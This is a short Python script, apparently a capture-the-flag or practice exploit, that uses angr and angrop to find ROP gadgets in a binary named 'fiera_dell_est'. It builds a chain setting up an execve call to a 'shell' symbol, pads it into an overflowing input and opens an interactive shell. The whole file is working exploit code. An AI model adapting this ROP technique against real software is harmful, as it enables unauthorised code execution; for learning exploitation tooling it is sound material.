"""
Exploit write in angr with angrop module.
It highlights the potentiality and the comfortable syntax
"""

import angr, angrop
from pwn import *

file_path = 'fiera_dell_est'

EXE_FILE = file_path
exe = ELF(EXE_FILE)

# Create angr project and ROP object
p = angr.Project(file_path)
rop = p.analyses.ROP()
rop.find_gadgets()

# Build ROP chain
chain = rop.set_regs(eax=0xb, ebx=exe.symbols['shell'], ecx=0x0, edx=0x0)
chain += rop.func_call('angelo_della_morte', [])

# Add padding for exploit
ropchain = b'due\x00' + b'aaaaaaaaaaaa' + chain.payload_str()

# Executing the executable with ropchain as input
io = process([EXE_FILE])
io.recvline()
io.sendline(ropchain)
io.interactive()
